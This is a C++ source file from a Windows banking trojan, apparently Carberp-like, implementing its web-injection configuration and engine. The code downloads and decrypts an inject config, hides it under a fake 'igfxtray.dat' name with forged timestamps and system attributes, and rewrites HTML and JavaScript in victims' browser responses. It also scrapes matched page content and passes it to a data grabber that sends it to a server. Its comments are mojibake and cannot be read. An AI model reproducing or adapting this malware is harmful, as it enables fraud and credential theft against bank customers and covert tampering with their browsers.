#include <windows.h>

#include "BotConfig.h"
#include "GetApi.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"
#include "Config.h"
#include "Crypt.h"
#include "BotUtils.h"
#include "Loader.h"

#include "Modules.h"

#include "BotMonitorMsg.h"

// ---------------------------------------------------------------------------

#include "BotDebug.h"

namespace CONFIGDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define CFGDBG CONFIGDEBUGSTRINGS::DBGOutMessage<>

// ---------------------------------------------------------------------------

bool bHttp;
bool bHttps;

// ����� ������ �������
PBotConfig BotConfig;

// ������� � ������� ���������� ������
DWORD ConfigProcess = 0;

// ����� ��������� �������� �������
// DWORD LastLoadConfigTime = 0;

#ifdef BV_APP
LPVOID InjectEventData; // ������ ��� ������ �������
THTMLInjectEvent InjectEvent; // ���������� ������� HTML �������

void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event) {
	// ������� ������������� ���������� ������� ��� ������� HTML
	InjectEventData = Data;
	InjectEvent = Event;
}

void CallHTMLInjectEvent(LPVOID Sender, THTMLInjectEventID ID, LPVOID Reserved)
{
	// �������� ������� �������
	if (InjectEvent != NULL) {
		InjectEvent(InjectEventData, Sender, ID, Reserved);
	}
}
#endif

void GetCurrentConfigHostSetings(bool * http, bool * https)
{
	*http = bHttp;
	*https = bHttps;
}

PCHAR FgrHostFromCfg = NULL; // 1
PCHAR GraHostFromCfg = NULL; // 2
PCHAR ScrHostFromCfg = NULL; // 3
PCHAR SniHostFromCfg = NULL; // 4
PCHAR PluginsHostFromCfg = NULL; // 5
DWORD TimeOut = 70;


// ----------------------------------------------------------------------------


void HTMLInjectSetVariableValue(THTMLInjectData *Data, const char* Variable, const char* Value)
{
	// ������� �������� �������� ����������
	Data->Before.Replace(Variable, Value);
	Data->Inject.Replace(Variable, Value);
	Data->After.Replace(Variable, Value);
}


void HTMLInjectSetSystemVariables(THTMLInjectData *Data)
{
	// ������� ������ ������������� ���� �� ��� ��������

	if (Data == NULL) return;

    const static char VariableBotID[] = {'%', 'b', 'o', 't', '_', 'i', 'd', '%', 0};
    const static char VariableDebug[] = {'%','d','e','b','u','g','%', 0};

	PCHAR BotID = GenerateBotID();
	#ifdef DEBUGCONFIG
	PCHAR IsDebug = "true";
	#else
	PCHAR IsDebug = "false";
	#endif


	HTMLInjectSetVariableValue(Data, VariableBotID, BotID);
    HTMLInjectSetVariableValue(Data, VariableDebug, IsDebug);

	STR::Free(BotID);
}

// ----------------------------------------------------------------------------


PCHAR ReadStrBlock_(PCHAR &Buf)
{
	// ������� ������ ������ �� ������ � ������� ��������� �� ������
	// ������ ������ (DWORD - ����� ������)(������)
	DWORD Size = *(DWORD*)Buf;
	Buf += sizeof(DWORD);
	if (Size == 0)
		return NULL;
	PCHAR Str = STR::New(Buf, Size);
	Buf += Size;
	return Str;
}

void ReadStrBlock_(PCHAR &Buf, string &Out)
{
	// ������� ������ ������ �� ������ � ������� ��������� �� ������
	// ������ ������ (DWORD - ����� ������)(������)
	DWORD Size = *(DWORD*)Buf;
	Buf += sizeof(DWORD);
	if (Size == 0) return;

	Out.Copy(Buf, 0, Size);

	Buf += Size;
}



bool DoLoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
{

	// ��������� ���������������� ����

	Config->HTMLInjects->Clear();

	CFGDBG("BotConfig", "��������� ����");

	HANDLE File = (HANDLE)pCreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ,
		0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (File == INVALID_HANDLE_VALUE)
	{
		CFGDBG("BotConfig", "������ �������� �����!");
		return false;
	}

	DWORD ID = 0;
	DWORD h = 0;
	DWORD FileSize = (DWORD)pGetFileSize(File, &h);
	LPBYTE FileBuf = (LPBYTE)MemAlloc(FileSize + 1);
	if (FileBuf == NULL)
	{
		pCloseHandle(File);
		return false;
	}

	m_memset(FileBuf, 0, FileSize + 1);

	DWORD Readed = 0;
	if (!pReadFile(File, FileBuf, FileSize, &Readed, NULL))
	{
		MemFree(FileBuf);
		pCloseHandle(File);
		return false;
	}


	// ��������� �������� �� ���� ��������

	if (!Config::IsConfig((PCHAR)FileBuf))
	{
		PCHAR Password = GetMainPassword();
		RC2Crypt::Decode(Password, (PCHAR)FileBuf, FileSize);
		STR::Free(Password);

		if (!Config::IsConfig((PCHAR)FileBuf))
		{
			MemFree(FileBuf);
			pCloseHandle(File);
			return false;
        }
	}

	// ������ ������
	PCHAR Buf = (PCHAR)XORCrypt::DecodeBuffer
		((PCHAR)ConfigSignature, FileBuf, Readed);
	if (Buf == NULL)
	{
		pCloseHandle(File);
		return false;
	}

	// ���������� ���� ���������� �������� �������� ���� ����
	Buf++;

	// ���������� ���������� �����
	DWORD Count = *(DWORD*)Buf;
	Buf += sizeof(DWORD);

	// ��������� ���������� � ������

	FgrHostFromCfg = ReadStrBlock_(Buf);
	GraHostFromCfg = ReadStrBlock_(Buf);
	ScrHostFromCfg = ReadStrBlock_(Buf);
	SniHostFromCfg = ReadStrBlock_(Buf);
	PluginsHostFromCfg = ReadStrBlock_(Buf);

	// ������ ���������� �������
	TimeOut = *(DWORD*)Buf;
	Buf += sizeof(DWORD);

	// ------------- ��������� ���������� -------------//
	bHttp = *Buf != 0;
	Buf++;

	bHttps = *Buf != 0;
	Buf++;

	// ------------- ��������� ������ �������� -------------//
	THTMLInject *Inject;
	THTMLInjectData *Data;
	DWORD DataCount;
	DWORD Mode;

	for (DWORD i = 0; i < Count; i++)
	{
		Inject = Config->HTMLInjects->AddInject();
		if (Inject == NULL)
			break;

		ID++;
		Inject->ID = ID;
		// ������ ����� �������
		Inject->URL = ReadStrBlock_(Buf);

		// ������ ������ ���������
		Mode = *(DWORD*)Buf;
		Buf += sizeof(DWORD);

		// ���������� ������ ������ �����
		Inject->GET = (Mode == 1 || Mode == 3 || Mode == 4 || Mode == 6);
		Inject->POST = (Mode == 2 || Mode == 3 || Mode == 5 || Mode == 6);
		Inject->IsLog = (Mode <= 3);

		DataCount = *(DWORD*)Buf;
		Buf += sizeof(DWORD);

		for (DWORD j = 0; j < DataCount; j++)
		{
			Data = Inject->AddData();
			if (Data == NULL)
				break;

			ID++;
			Data->ID = ID;
			ReadStrBlock_(Buf, Data->Before);
			ReadStrBlock_(Buf, Data->Inject);
			ReadStrBlock_(Buf, Data->After);

//			Data->Before = ReadStrBlock_(Buf);
//			Data->Inject = ReadStrBlock_(Buf);
//			Data->After = ReadStrBlock_(Buf);

			if (!Data->Before.IsEmpty())
				Data->MacrosHash = Data->Before.Hash();
				;

			// � ������� ���� ��������� ���������� � ������ �������� �������
			#ifndef BV_APP
				HTMLInjectSetSystemVariables(Data);
			#endif

		}
	}
	MemFree(FileBuf);

	// �������� ����� ��������� �����
	FILETIME Tm;
	pGetFileTime(File, &Tm, &Tm, &Config->ConfigTime);

	// -------------------------------
	pCloseHandle(File);

	CFGDBG("BotConfig", "���� ��������");

	// ��������� ��� ���������� ������������ �����
	Config->LastConfigFile = WSTR::New(FileName);

	return true;
}
// ----------------------------------------------------------------------------

bool Config::LoadConfigFromFile(PBotConfig Config, PWCHAR FileName)
{
	// ��������� ���� �������
	if (BotConfig == NULL || WSTR::IsEmpty(FileName))
		return false;
	pEnterCriticalSection(&Config->Lock);


	bool Result = DoLoadConfigFromFileEx(Config, FileName);

	pLeaveCriticalSection(&Config->Lock);

	#ifdef BOTMONITOR
		if (Result)
		{
        	PCHAR FN = WSTR::ToAnsi(FileName, 0);
			MONITOR_MSG(BMCONST(ConfigLoadFile), FN);
			STR::Free(FN);
		}
	#endif

	return Result;

}

// ----------------------------------------------------------------------------
void CheckConfigUpdates(PBotConfig Config)
{
	// ������� ��������� �� ������������� ������������ �������
	// ��� ������� � ������ ����, ��� ������� ����� �������
	// � ����������� ������
#ifndef BV_APP
	if (Config->LastConfigFile == NULL)
		return;

	HANDLE File = (HANDLE)pCreateFileW(Config->LastConfigFile, GENERIC_WRITE, FILE_SHARE_READ,
		0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (File == INVALID_HANDLE_VALUE)
		return;


	FILETIME Tm, WT;
	GetFileTime(File, &Tm, &Tm, &WT);
	bool NeedUpdate = Config->ConfigTime.dwLowDateTime != WT.dwLowDateTime ||
                      Config->ConfigTime.dwHighDateTime != WT.dwHighDateTime;

	pCloseHandle(File);

	if (NeedUpdate)
	{
    	PWCHAR FN = WSTR::New(Config->LastConfigFile);
		CFGDBG("BotConfig", "���� ������� ���������. ���������.");
		DoLoadConfigFromFileEx(Config, FN);
		WSTR::Free(FN);
	}
#endif
}

// ----------------------------------------------------------------------------

void FreeHTMLInjectData(LPVOID Data)
{
	// ���������� ������ HTML �������
	delete (THTMLInjectData*)Data;
}

void HTMLInjects::FreeInject(THTMLInject *Inject)
{
	if (Inject == NULL)
		return;

	if (Inject->RefCount > 0)
	{
		Inject->DestroyAfterRelease = true;
		return;
	}

	delete Inject;
}


// ----------------------------------------------------------------------------
void HTMLInjects::ReleaseInjectsList(PList List)
{
	// ������� ����������� ������ ��������
	// ������� ���� �������� ��� �������
	if (List == NULL)
		return;

	PBotConfig Config = Config::GetConfig();
	if (Config == NULL)
		return;

	pEnterCriticalSection(&Config->Lock);

    List::SetFreeItemMehod(List, NULL);

	for (DWORD i = 0; i < List::Count(List); i++)
	{
		THTMLInject *Inject = (THTMLInject*)List::GetItem(List, i);
		if (Inject->RefCount > 0)
			Inject->RefCount--;
		if (Inject->RefCount == 0 && Inject->DestroyAfterRelease)
			FreeInject(Inject);

	}

    List::Clear(List);

	pLeaveCriticalSection(&Config->Lock);
}

// ----------------------------------------------------------------------------

PBotConfig Config::Create()
{
	PBotConfig C = CreateStruct(TBotConfig);
	if (C == NULL)
		return NULL;
	C->HTMLInjects = new THTMLInjectList();
	pInitializeCriticalSection(&C->Lock);
	return C;
}
// ----------------------------------------------------------------------------

void Config::Free(PBotConfig Cfg)
{
	// ������� ���������� ��������� �������
	if (Cfg == NULL)
		return;
	Clear(Cfg);
	List::Free(Cfg);
//	pDeleteCriticalSection(&Cfg->Lock);
	FreeStruct(Cfg);
}

// ----------------------------------------------------------------------------

bool ConfigDoGetInjectsForRequest(PBotConfig BotConfig, PRequest Request) {
	// �������� ������� ��� �������

	// �������� ������
	PCHAR URL = Request->URL;
	bool DelURL = false;
	if (Request->Optional != NULL) {
		// ��������� � ������ ������������ ������
		PCHAR C = NULL;
		if (STR::Scan(Request->Optional, '?') == NULL)
			C = "?";
		URL = STR::New(3, Request->URL, C, Request->Optional);
		DelURL = true;
	}

	// ��������� �������
	DWORD Count = BotConfig->HTMLInjects->Count();
	for (DWORD i = 0; i < Count; i++)
	{
		THTMLInject *Inject = BotConfig->HTMLInjects->Items(i);


		if (Inject->Disabled)
			continue;

		// ���������� ������ � ������
		if ((Request->Method == hmGET && Inject->GET) ||
			(Request->Method == hmPOST && Inject->POST))
			if (CompareUrl(Inject->URL.t_str(), URL))
			{
				Inject->Used = true;

				#ifdef BV_APP
					CallHTMLInjectEvent(Inject, injMaskFinded, NULL);
				#endif

				#ifdef BOTMONITOR
					BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigMaskExec, (PCHAR)&Inject->ID, sizeof(Inject->ID));
				#endif

				if (Request->Injects == NULL)
					Request->Injects = List::Create();

				List::Add(Request->Injects, Inject);
				Inject->RefCount++; // ����������� ������� ������������� �������
				Request->IsInject = true;
			}
	}
	//
	if (DelURL)
		STR::Free(URL);

	return Request->IsInject;
}
//----------------------------------------------------------------------------

bool Config::GetInjectsForRequest(PRequest Request) {

	if (Request == NULL || STR::IsEmpty(Request->URL))
		return false;

	// �������������� ���������������� ����
	PBotConfig BotConfig = Config::GetConfig();
	if (BotConfig == NULL)
		return false;

	pEnterCriticalSection(&BotConfig->Lock);

    CheckConfigUpdates(BotConfig);

	bool Result = ConfigDoGetInjectsForRequest(BotConfig, Request);

	pLeaveCriticalSection(&BotConfig->Lock);

	return Result;
}
// ----------------------------------------------------------------------------

bool Config::IsInjectURL(PCHAR URL, THTTPMethod Method)
{
	// ������� ��������� ���� �� ��� ���������� ������ ������
	if (STR::IsEmpty(URL))
		return false;

	DWORD Count = BotConfig->HTMLInjects->Count();

	for (DWORD i = 0; i < Count; i++)
	{
		THTMLInject *Inject = BotConfig->HTMLInjects->Items(i);

		if (Inject->Disabled)
			continue;

		// ���������� ������ � ������
		if ((Method == hmGET && Inject->GET) ||
			(Method == hmPOST && Inject->POST))
			if (CompareUrl(Inject->URL.t_str(), URL))
			{
				return true;
			}
	}

    return false;
}
//----------------------------------------------------------------------------


WCHAR ConfigFileName[MAX_PATH] = {0};
WCHAR ConfigFileName_HP[MAX_PATH] = {0}; // ������ ����� �������� ����������
WCHAR BOT_CONFIG_NAME[] = {
	'\\', 'i', 'g', 'f', 'x', 't', 'r', 'a', 'y', '.', 'd', 'a', 't', 0
};
WCHAR BOT_CONFIG_NAME_HP[] = {
	'\\', 'i', 'g', 'f', 'x', 't', 'r', 'a', 'y', 'h', 'p', '.', 'd', 'a', 't',
	0
};

PWCHAR Config::GetFileName(bool HightPriority) {
	// ������� ���������� ��� ����� �� ���������
	PWCHAR FileName = NULL;

	if (!HightPriority)
		FileName = &ConfigFileName[0];
	else
		FileName = &ConfigFileName_HP[0];

	if (*FileName == 0) {
		WCHAR *AppPath = GetShellFoldersKey(2);

		if (AppPath == NULL)
			return NULL;

		plstrcpyW(FileName, AppPath);
		if (!HightPriority)
			plstrcatW(FileName, BOT_CONFIG_NAME);
		else
			plstrcatW(FileName, BOT_CONFIG_NAME_HP);

		MemFree(AppPath);
	}

	return FileName;
}

// ----------------------------------------------------------------------------
void Config::SetFileName(PWCHAR FileName) {
	// ������� ������������� ��� ����� �� ���������
	// DWORD Len = m_wcslen(FileName);
	plstrcpyW(ConfigFileName, FileName);
}

// ----------------------------------------------------------------------------

bool Config::IsConfig(PCHAR Buf) {
	// ������� ���������� ������ ���� ����� �������� ��������
	return StrSame(Buf, (PCHAR)ConfigSignature, true, StrCalcLength(ConfigSignature));
}
// ----------------------------------------------------------------------------

bool Config::Download(PCHAR URL)
{
	if (STR::IsEmpty(URL))
		return false;

	PCHAR Buf = NULL;

	// ��������� ����
	if (!HTTP::Get(URL, &Buf, NULL))
		return false;

	// �������������� ����
	#ifdef CryptHTTPH
	if (!IsConfig(Buf))
	{
		PCHAR Password = GetMainPassword();
		RC2Crypt::DecodeStr(Password, Buf);
		STR::Free(Password);
	}
	#endif

	bool Result = IsConfig(Buf);

	// ���������� ������ � ����
	if (Result)
	{
		PWCHAR FileName = GetFileName();

		pSetFileAttributesW(FileName, FILE_ATTRIBUTE_ARCHIVE);

		File::WriteBufferW(FileName, Buf, STR::Length(Buf));

		SetFakeFileDateTimeW(FileName);
		pSetFileAttributesW(FileName,
			FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
	}

	STR::Free(Buf);

	return Result;
}

// ----------------------------------------------------------------------------

PBotConfig Config::Initialize(PWCHAR FileName, bool IsNewApplication,
	bool DontLoad) {
	// ���������������� ��������� ����
	if (IsNewApplication) {
		BotConfig = NULL;
	}
	if (BotConfig == NULL)
	{
		BotConfig = Create();
		if (!DontLoad)
		{
			if (FileName == NULL)
			{
				FileName = GetFileName(true);
				if (!FileExistsW(FileName))
					FileName = GetFileName();
			}

			LoadConfigFromFile(BotConfig, FileName);
		}
	}

	return BotConfig;

}

// ----------------------------------------------------------------------------

PBotConfig Config::GetConfig()
{
	// ������� ���������� �� ������ ����
	return BotConfig;
}
// ----------------------------------------------------------------------------

void Config::Clear(PBotConfig Config)
{
	// �������� ����� �������
	if (Config == NULL)
		Config = BotConfig;
	if (Config)
	{
		pEnterCriticalSection(&Config->Lock);

		Config->HTMLInjects->Clear();

		WSTR::Free(Config->LastConfigFile);
		Config->LastConfigFile = NULL;
		pLeaveCriticalSection(&Config->Lock);
    }
}
// ----------------------------------------------------------------------------

bool SubstitudeText2(PCHAR Buffer, PCHAR &NewBuffer, PCHAR Before,
	PCHAR Inject, PCHAR After, DWORD &NewBufLen) {
	// ������� ��������� ����� Inject ����� ������� Before � After
	NewBufLen = 0;
	NewBuffer = NULL;
	if (Buffer == NULL)
		return false;

	bool B = !STR::IsEmpty(Before);
	bool A = !STR::IsEmpty(After);
	bool I = !STR::IsEmpty(Inject);

	bool Valid = (B && I && A) || (B && A) || (B && I) || (I && A);

	if (!Valid)
		return false;

	// ������� ����� ������
	DWORD BStart = 0;
	DWORD BEnd = 0;
	DWORD BLen = 0;
	// ������� ����� After
	DWORD AStart = 0;
	DWORD AEnd = 0;
	DWORD ALen = 0;

	//DWORD BufferLen = StrCalcLength(Buffer);

	PCHAR AfterPtr = NULL;

	// ���� ���� Before
	if (B)
	{
		if (!WildCmp(Buffer, Before, &BStart, &BEnd, &BLen))
			return false;
	}

	// ���� ���� After
	if (A)
	{
		PCHAR BeforePtr = Buffer + BEnd;
		if (!WildCmp(BeforePtr, After, &AStart, &AEnd, &ALen))
			return false;
		AfterPtr = BeforePtr + AStart;
		// ���� �� ������ ���� Before �� ��������� ����� ����� �� ������
		// ����� After
		if (!B)
			BEnd = AStart;
	}
	else
		AfterPtr = Buffer + BEnd; // ������ ��������� �� ����� ����� Before

	DWORD InjectLen = StrCalcLength(Inject);
	DWORD AfterLen = StrCalcLength(AfterPtr);

	// ������ ����� �����
	NewBufLen = BEnd + InjectLen + AfterLen;
	PCHAR Buf = (PCHAR)MemAlloc(NewBufLen + 1);
	if (Buf == NULL)
		return false;

	NewBuffer = Buf;

	// �������� ������
	m_memcpy(Buf, Buffer, BEnd);
	Buf += BEnd;
	m_memcpy(Buf, Inject, InjectLen);
	Buf += InjectLen;
	m_memcpy(Buf, AfterPtr, AfterLen);
	Buf += AfterLen;
	*Buf = 0;

	return true;
}
// ----------------------------------------------------------------------------

PCHAR GetHTMLLogCode(PCHAR Buffer, THTMLInject *Inject)
{
	// ������� ���������� HTML ��� �������� �������� �������
	if (STR::IsEmpty(Buffer) || Inject == NULL)
		return NULL;

	PStrings S = Strings::Create();
	bool Added = false;
	PCHAR Code;
	PCHAR Tmp;
	DWORD Count = Inject->Count();
	THTMLInjectData *Data;

	for (DWORD i = 0; i < Count; i++)
	{
		Data = Inject->Items(i);
		Code = GetTextBetween(Buffer, Data->Before.t_str(), Data->After.t_str());
		if (Code != NULL)
		{
			Added = true;
			if (!Data->Inject.IsEmpty())
			{
				Tmp = Code;
				Code = STR::New(3, Data->Inject.t_str(), ": ", Tmp);
				STR::Free(Tmp);
			}
			Strings::Add(S, Code, false);

			Data->State = idsOk;

			#ifdef BOTMONITOR
				BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigDataExec, (PCHAR)&Data->ID, sizeof(Data->ID));
			#endif
			// #ifdef BV_APP
			// CallHTMLInjectEvent(Data->Source, injDataHandled, NULL);
			// #endif
		}
	}
	PCHAR Result = NULL;

	if (Added)
		Result = Strings::GetText(S, " ");

	Strings::Free(S);
	return Result;
}

// ----------------------------------------------------------------------------

bool SendHTMLLogToServer(PCHAR Buffer, THTMLInject *Inject, PHTTPSessionInfo Session)
{
	// ������� ���������� ����� HTML �� ��������� � ���������� ������
	if (Inject == NULL || !Inject->IsLog)
		return false;

	// �������� ����������� ������
	PCHAR SendBuffer = NULL;

	PCHAR Data = GetHTMLLogCode(Buffer, Inject);

	if (Data == NULL)
		return false;

	DWORD BrowserType = 0;
	PCHAR UserAgent = NULL;
	PCHAR URL = NULL;

	if (Session != NULL) {
		BrowserType = Session->BrowserType;
		UserAgent = Session->UserAgent;

		// ��������� ������ ����������� � ����������� ������
		if (Session->URL) {
			URL = Session->URL;
			StrConcat(SendBuffer, 3, Session->URL, "|", Data);
			STR::Free(Data);
		}

	}

	if (SendBuffer == NULL)
		SendBuffer = Data;

	DataGrabber::AddData(URL, SendBuffer, UserAgent, BrowserType,
		DATA_TYPE_INJECT, false);

	STR::Free(SendBuffer);

	return true;
}

// ----------------------------------------------------------------------------

bool InjectHTMLCode(PRequest Request, THTMLInject *Inject)
{
	// ����� ������������ ����������� HTML ��������
	if (Request == NULL || Inject == NULL)
		return false;

	PCHAR NewBuffer = NULL;
	DWORD NewLen = 0;

	DWORD Count = Inject->Count();
	bool Injected; // ������� ����, ��� ��� ��������� ����-�� ���� ������

	PCHAR BotID = GenerateBotID();

	for (DWORD i = 0; i < Count; i++)
	{
		THTMLInjectData *SourceData = Inject->Items(i);

		// ����������� ������ ����������
		if (SourceData->Disabled) continue;

		// ����� �������� �������� ������, �.�. ���������
		// ������� ����� ��������� ������� �������
		THTMLInjectData *Data = new THTMLInjectData(NULL);
		Data->Copy(*SourceData);

		#ifdef BV_APP
			// �������� ���������� ����������
			HTMLInjectSetSystemVariables(Data);
		#endif


		Injected  = false;
		NewBuffer = NULL;
		NewLen    = 0;

		if (Data->MacrosHash == 0)
		{
			Data->MacrosHash = Data->Before.Hash();
			SourceData->MacrosHash = Data->MacrosHash;
        }

		if (Data->MacrosHash == HIM_REPLACE_DOCUMENT)
		{
			// �������� �� ���������� ���������
			Injected = true;
			NewBuffer = Data->Inject.t_str();
            NewLen    = Data->Inject.Length();
		}
		else
		// �������� HTML ��� � ��������
		{
			// ����� �������� �������� �� �������� �� ������
			// ������� � ������ �������

			bool IsLinuxStr = STR::IsLinuxStr((PCHAR)Request->Buffer);
			if (IsLinuxStr)
			{
				Data->Before.ConvertToLinuzFormat();
				Data->Inject.ConvertToLinuzFormat();
				Data->After.ConvertToLinuzFormat();
			}

			// ��������� ������� ������
			if (SubstitudeText2((PCHAR)Request->Buffer, NewBuffer, Data->Before.t_str(),
					Data->Inject.t_str(), Data->After.t_str(), NewLen))
			{
				Injected = true;
			}
        }


		if (Injected)
		{
        	// ������ ��������, ������������ ������
			Request::SetBuffer(Request, (LPBYTE)NewBuffer, NewLen);

			SourceData->State = idsOk;

			#ifdef BOTMONITOR
				BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigDataExec, (PCHAR)&SourceData->ID, sizeof(SourceData->ID));
			#endif

			#ifdef BV_APP                                               
				CallHTMLInjectEvent(SourceData, injDataHandled, NULL);
			#endif
		}


		delete Data;
	}

	STR::Free(BotID);

	return Injected;

}

// ----------------------------------------------------------------------------

bool HTMLInjects::Execute(PRequest Request, PHTTPSessionInfo Session) {
	// ���������� HTML �������.
	//
	// ������� ���������� ������ ���� � ������
	// ������� ���� ������� ���������

	if (Request == NULL || !Request->IsInject)
		return false;

	Request->Injected = true; // ������������� ������� ������������ ��������

	bool Result = false;
	THTMLInject *Inject;
	PCHAR NewBuffer;
	DWORD Count = List::Count(Request->Injects);

	for (DWORD i = 0; i < Count; i++) {
		Inject = (THTMLInject*)List::GetItem(Request->Injects, i);
		if (Inject->IsLog)
			SendHTMLLogToServer((PCHAR)Request->Buffer, Inject, Session);
		else {
			// �������� ���� ��� � ����������� ������
			NewBuffer = NULL;
			if (InjectHTMLCode(Request, Inject))
				Result = true;
		}

	}
	return Result;
}
// ----------------------------------------------------------------------------

bool CheckContentType(PCHAR CType, PCHAR *Types)
{
	for (int i = 0; Types[i] != NULL; i++)
	{
		if (STR::Pos(CType, Types[i], 0, false) >= 0)
        	return true;
	}
	return false;
}

bool HTMLInjects::SupportContentType(PCHAR CType) {
	// ������� ���������� ������ ���� ��������� ��� ��������
	// �������������� �������� ������� HTML
	if (CType == NULL)
		return false;
	if (StrSame(CType, "text/", false, 5))
		return true;

	PCHAR Temp;
	bool FreeStr = false;
	if (STR::Scan(CType, ';') != NULL) {
		Temp = STR::GetLeftStr(CType, ";");
		FreeStr = true;
	}
	else
		Temp = CType;

	PCHAR Types[] = {
					  "application/x-javascript",
					  "application/javascript",
					  "application/xml",
					  "application/xhtml+xml",
						NULL};


	bool Result = CheckContentType(Temp, Types);
	if (FreeStr)
		STR::Free(Temp);
	return Result;
}
// ----------------------------------------------------------------------------


//*****************************************************************************
//                              THTMLInjectList
//*****************************************************************************

THTMLInjectList::THTMLInjectList()
{
	FInjects = List::Create();
}

THTMLInjectList::~THTMLInjectList()
{
	Clear();
	List::Free(FInjects);
}

THTMLInject* THTMLInjectList::AddInject()
{
	// ������� ��������� ����� ������
    return new THTMLInject(this);
}

void THTMLInjectList::ResetInjectsStatus()
{
	int C = Count();
	for (int i = 0; i < C; i++)
	{
		THTMLInject *Inject = Items(i);
		int DC = Inject->Count();
		for (int j = 0; j < DC; j++)
		{
            Inject->Items(j)->State = idsUnknown;
		}
	}
}

void THTMLInjectList::Clear()
{
	// ������� ������� ������ ��������
	for (DWORD i = List::Count(FInjects); i > 0; i--)
		delete (THTMLInject*)List::GetItem(FInjects, i);

}

//*****************************************************************************
//                              THTMLInject
//*****************************************************************************


THTMLInject::THTMLInject(THTMLInjectList *aOwner)
{
	FOwner = aOwner;
	if (FOwner)
		List::Add(FOwner->FInjects, this);
	FInjects = List::Create();
}

THTMLInject::~THTMLInject()
{
	if (FOwner)
		List::Remove(FOwner->FInjects, this);
    Clear();
	List::Free(FInjects);
}

THTMLInjectData* THTMLInject::AddData()
{
	return new THTMLInjectData(this);
}

void THTMLInject::Clear()
{
	// ������� ������� ������ ��������
	for (DWORD i = List::Count(FInjects); i > 0; i--)
		delete (THTMLInjectData*)List::GetItem(FInjects, i);
}

//*****************************************************************************
//                              THTMLInjectData
//*****************************************************************************

THTMLInjectData::THTMLInjectData(THTMLInject *aOwner)
{
	FOwner = aOwner;
	if (FOwner)
		List::Add(FOwner->FInjects, this);
}

THTMLInjectData::~THTMLInjectData()
{
	if (FOwner)
		List::Remove(FOwner->FInjects, this);
}


void THTMLInjectData::Copy(const THTMLInjectData &Data)
{
	// ������� �������� ������
	Before = Data.Before;
	Inject = Data.Inject;
	After  = Data.After;
	State  = Data.State;
	MacrosHash = Data.MacrosHash;
	Disabled = Data.Disabled;
}


bool THTMLInjectData::IsValid()
{
	// ������� ���������� ������ ���� ������ ����� ������������
	// � ��������
	bool B = !Before.IsEmpty();
	bool I = !Inject.IsEmpty();
	bool A = !After.IsEmpty();

	return(B && I && A) || (B && A) || (B && I) || (I && A);

}
